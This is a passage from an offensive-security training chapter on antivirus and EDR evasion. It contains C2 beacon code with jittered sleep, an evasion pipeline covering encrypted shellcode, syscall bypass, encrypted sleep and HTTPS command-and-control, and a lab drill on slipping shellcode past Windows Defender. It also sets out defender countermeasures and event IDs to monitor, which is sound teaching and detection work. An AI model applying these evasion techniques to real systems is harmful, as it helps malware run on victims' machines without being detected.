        INTERNET_FLAG_NO_CACHE_WRITE,    // don't write to cache
        0
    );

    HttpSendRequestA(hReq, NULL, 0, NULL, 0);  // send the request

    // Read response (task data from C2)
    char buf[4096] = {0};
    DWORD read = 0;
    InternetReadFile(hReq, buf, sizeof(buf) - 1, &read);

    InternetCloseHandle(hReq);

    // Sleep with jitter — avoid regular timing pattern (detectable)
    DWORD sleep_ms = 30000 + (rand() % 15000);  // 30-45 seconds random
    Sleep(sleep_ms);
}
```

### Technique 5B: Beacon Timing with Jitter

Regular beacon intervals (check in every 30 seconds, exactly) are detected
by network analysis tools — they look for machines that call home on a
clock. Add jitter: a random delay added to the base interval.

```python
# Jitter calculation (server-side or implant-side)
import random, time

base_sleep = 30          # 30 second base interval
jitter_percent = 30      # ±30% variation

while True:
    # ... execute task ...
    jitter = base_sleep * (jitter_percent / 100.0)      # 30% of base = 9 seconds
    actual_sleep = base_sleep + random.uniform(-jitter, jitter)  # 21–39 seconds
    time.sleep(actual_sleep)   # sleep random amount — no regular timing signature
```

---

## Section 6 — Building a Full Evasion Pipeline

No single technique defeats all five gates. Evasion is a pipeline — each
layer addressed in sequence:

```
EVASION PIPELINE: IRON-DOME ARCHITECTURE

RAW SHELLCODE (msfvenom / custom)
    │
    ▼ [Gate 1 fix: AES-256-CBC encrypt]
ENCRYPTED BLOB (random-noise bytes — no signature match)
    │
    ▼ [Gate 2 fix: API hashing + string encryption + PE cleanup]
CLEAN LOADER (no suspicious strings, no flagged imports, stripped PE)
    │
    ▼ [Gate 3 fix: indirect syscalls + callback execution + sandbox check]
RUNTIME BEHAVIOR (no VirtualAlloc→CreateThread chain; no EDR hooks triggered)
    │
    ▼ [Gate 4 fix: encrypted sleep + PE header stomp]
MEMORY FOOTPRINT (no plaintext shellcode during sleep; no MZ header in memory)
    │
    ▼ [Gate 5 fix: HTTPS C2 + jittered timing + spoofed headers]
C2 TRAFFIC (looks like normal browser traffic to a web service)
    │
    ▼
EXECUTION ON TARGET
```

Each layer in the pipeline peels off one detection mechanism. The pipeline
is not a recipe you follow blindly — it's a framework. When a new detection
technique emerges, you identify which gate it operates at and add the
appropriate counter to that layer.

### The Arms Race

Every bypass listed in this chapter has a detection method:

```
Technique            Defender Counter
─────────────────    ──────────────────────────────────────────────
AES-encrypted blob   Behavioral detonation sandbox — decrypt at runtime
Dynamic API resolve  ETW hook on PEB walk — observe which exports are resolved
Direct syscalls      Kernel ETW — monitor syscall instruction at ring 0
Callback execution   Enumerate known callback patterns + monitor return addresses
Encrypted sleep      Stack unwinding checks — sleeping thread with no stack frames
Module stomping      Compare in-memory image bytes to on-disk PE bytes
HTTPS C2             JA3/JA3S fingerprint — TLS client hello fingerprint detection
```

Your job is not to memorize a list of tricks. It's to understand the
MECHANISM behind each gate so you can adapt when the current bypass gets burned.
That understanding is the same thing you need to defend your own infrastructure —
which is why this chapter exists.

---

## A Note on `defender_scan.exe` and `xor_encode.exe`

The interactive exercises for this chapter (in the terminal replay widget)
show two commands:

```
C:\lab> defender_scan.exe payload.exe
C:\lab> xor_encode.exe payload.exe --key 0x4D
```

**These are fictional placeholder tools used for illustration only.** They
do not exist. No download link. No package. If you spend time searching for
them, you will find nothing.

Here is what you actually use in the real workflow:

**Scanning for detection rate:**
- Upload to **VirusTotal** (virustotal.com) — shows detection across 70+ AV engines.
  WARNING: never upload real operational payloads. Submissions are public.
- Run locally with **Windows Defender command line**:
  ```powershell
  # Trigger Defender scan on a specific file (admin not required)
  Start-MpScan -ScanType 3 -File "C:\lab\payload.exe"
  # Check result: Get-MpThreatDetection (lists any threats found)
  ```
- Use **DefenderCheck** (github.com/matterpreter/DefenderCheck):
  ```powershell
  DefenderCheck.exe payload.exe
  # Binary-searches through your file to find the exact byte range Defender flags
  ```

**XOR encoding:**
- Use the Python script from Section 1 (`xor_encoder.py`) — you just wrote it.
- Or compile your own `xor_encode.exe` using the C code in Section 1.
  Building your own tools is the point of this course.

The fictional terminal demo shows you WHAT the workflow looks like.
The Python scripts and C code in this chapter give you the ACTUAL TOOLS
to replicate it. Every tool in this chapter is either installed via `winget`/`pip`,
or is code you compile yourself.

---

## DEFENDER TAKEAWAY

This is the chapter defenders most need to understand. Everything above
describes what an attacker does — and therefore exactly what you should
be watching for and blocking.

- **Enable Defender's memory integrity (HVCI) in Windows Security → Device Security → Core Isolation.** This prevents unsigned kernel code from running, which closes BYOVD attacks used to disable Defender before payload delivery. Go do this right now if it's not enabled.

- **Watch Event ID 4688 (Process Creation) with command line logging enabled.** Enable it via GPO: `Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy → Detailed Tracking → Audit Process Creation`. Every process spawn creates an event. Unusual parent-child pairs (Word spawning cmd.exe, svchost spawning unknown processes) are Gate 3 behavioral IOCs.

- **Watch Event ID 7045 (New Service Installed) and 4697 (Service Installed in Audit Log).** Payload persistence via services fires these. Alert on any new service installed outside of your approved change window.

- **Watch Event ID 10 (ProcessAccess) in Sysmon if deployed.** `OpenProcess` with `PROCESS_VM_WRITE` against processes you don't own is injection. Alert on any process reading/writing memory of svchost.exe, lsass.exe, or explorer.exe unless it's a known legitimate tool.

- **Block outbound traffic by default, whitelist by exception.** Gate 5 evasion becomes significantly harder when your C2 beacon can't reach anything on the internet. Only allow known-good destinations. Beacons over HTTPS to unknown CDN IPs show up as anomalous DNS and connection logs.

- **Enable Defender's cloud-delivered protection and automatic sample submission.** Novel payloads that pass local static scans often get caught by cloud ML within minutes of the first submission from any machine globally. "First seen" events are a detection trigger.

- **Log PowerShell (Event IDs 4103, 4104 — Script Block Logging).** Enable via GPO: `Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging`. Every PowerShell block executed gets logged — fileless delivery via IEX cradles is immediately visible.

- **Deploy Sysmon with a baseline ruleset (SwiftOnSecurity's config).** Sysmon adds Event ID 3 (Network Connection), 7 (Image Loaded), 8 (CreateRemoteThread), 10 (ProcessAccess), 11 (FileCreate), 25 (ProcessTampering) — the entire behavioral chain described in this chapter becomes visible in your event log. Download config: github.com/SwiftOnSecurity/sysmon-config.

---

## Key Terms

| Term | Definition |
|------|-----------|
| **Five-gate model** | 22DIV framework classifying AV/EDR detection into five sequential layers: static signature, heuristic, behavioral, memory scanning, and network/cloud detection |
| **IRON-DOME** | 22DIV evasion pipeline that addresses each of the five gates in sequence — encryption, PE cleanup, syscall bypass, memory re-encryption, and HTTPS C2 |
| **Static signature** | Byte pattern matching at file-scan time; defeated by encrypting the payload so the scanner sees no recognizable bytes |
| **Heuristic analysis** | Pattern-based analysis of code structure and import tables before execution; defeated by dynamic API resolution and PE anomaly cleanup |
| **Behavioral detection** | Runtime monitoring of API call sequences via ntdll.dll hooks; defeated by direct/indirect syscalls that skip ntdll entirely |
| **Memory scanning** | Periodic scan of process memory for shellcode signatures; defeated by encrypted sleep (re-encrypt during sleep) and PE header stomping |
| **Gate 5 / network detection** | Monitoring of C2 traffic signatures and destination reputation; defeated by HTTPS with valid cert, jittered timing, and malleable profiles |
| **XOR encoding** | Scramble every payload byte with a key; single-byte XOR is crackable by trying all 256 keys; rolling/multi-byte XOR is harder |
| **Per-vector key isolation** | Using a different XOR key byte for each position (rolling key); defeats frequency analysis that breaks single-byte XOR |
| **AES-CBC** | AES encryption in Cipher Block Chaining mode; 256-bit random key per payload makes static analysis impossible without the key |
| **Dynamic API resolution** | Calling `GetProcAddress` at runtime to find function addresses rather than importing them statically; removes suspicious strings from the binary |
| **API hashing** | Walking export tables and matching by hash value; eliminates all function name strings from the binary entirely |
| **Direct syscall** | Calling the Windows kernel directly via inline `syscall` assembly instruction, bypassing ntdll.dll and its EDR hooks |
| **Hell's Gate** | Technique to dynamically read syscall numbers (SSNs) from ntdll's in-memory stubs, enabling direct syscalls without hardcoded numbers |
| **Halo's Gate** | Extension of Hell's Gate for when the target function is already hooked; reads SSN from neighboring functions and adjusts by offset |
| **Callback execution** | Executing shellcode by passing its address as a Windows callback function (EnumDesktopsA, CreateTimerQueueTimer etc.) instead of CreateThread |
| **Encrypted sleep** | Re-encrypting the shellcode in memory before sleeping, decrypting on wake; closes the memory-scan window during idle periods |
| **PE header stomping** | Zeroing the MZ/PE headers of a loaded payload after execution begins; defeats malfind-style forensic tools that scan for PE signatures |
| **Module stomping** | Overwriting the .text section of a loaded legitimate DLL with shellcode; memory scanners see a legitimate module address |
| **Sandbox detection** | Checking environmental indicators (RAM, CPU count, disk size, VM artifacts) before executing; payload exits if analysis environment is detected |
| **Jitter** | Random variation added to beacon sleep intervals; defeats network analysis that looks for regular callback timing patterns |
| **HVCI** | Hypervisor-Protected Code Integrity (Memory Integrity); prevents unsigned kernel code from running, closing BYOVD attack chains |
| **Sysmon Event 8** | CreateRemoteThread event — logged every time a thread is created in a different process; primary detection event for injection |
| **Event ID 4688** | Process creation event in Windows Security log; with command-line auditing enabled, captures every process launch with arguments |

---

## Drill 12 — Antivirus Evasion Lab

Go to `DRILLS/12_av_evasion/`. A Windows 11 VM with Defender enabled and
real-time protection ON. Your target is to deliver shellcode and execute it
without triggering a Defender alert.

Your missions:

1. **Gate 1 baseline**: Compile a raw shellcode loader from Chapter 09
   (unencoded, plain VirtualAlloc + CreateThread). Drop it on the VM.
   Document whether Defender fires and at what stage (on write, on execute).
   This is your baseline — everything you do next is measured against it.

2. **XOR encode**: Run `xor_encoder.py` on your shellcode with key `0x4D`.
   Embed the encoded bytes. Add the decode stub. Recompile. Drop on VM.
   Does Defender fire on write? On execute? Document the result.

3. **AES encrypt**: Run `aes_encryptor.py` on your shellcode. Embed the
   encrypted blob, key, and IV. Add the BCrypt decrypt stub. Recompile.
   Strip PE. Drop on VM. Document result.

4. **Dynamic imports**: Remove all static imports of `VirtualAlloc`,
   `VirtualProtect`, `CreateThread`. Replace with `GetProcAddress` resolution.
   XOR-encrypt the function name strings. Recompile. Drop on VM.
   Does heuristic analysis fire differently?

5. **Sandbox check**: Add `is_sandbox()` to the loader. Deliberately trigger
   it (set CPU count < 2 in VM settings). Confirm the loader exits without
   executing. Restore VM settings and confirm it executes.

6. **Callback execution**: Replace `CreateThread` with `EnumDesktopsA`.
   Verify Defender's behavioral engine reacts differently. Document which
   Sysmon event IDs fire with CreateThread vs EnumDesktopsA.

7. **Memory scan window**: Add the encrypted sleep stub. Use Process Hacker
   to monitor the memory region during the sleep window. Confirm permissions
   switch from RX to RW and back. Confirm byte content is encrypted during sleep.

8. **Full pipeline**: Combine all techniques — AES payload, clean PE,
   dynamic imports, sandbox check, callback execution, encrypted sleep.
   What is the detection rate? How many gates does it now pass?

For each stage: document what triggered (if anything), which Event IDs fired
in Windows Security log, and what Process Hacker showed for the memory region.

The deliverable is a lab report documenting which technique defeated which
gate. Not a working payload — the understanding of WHY each layer worked.

---

— ENCRYPTED at rest, DECRYPTED in memory,
the scanner's WINDOW closes before the pattern lands

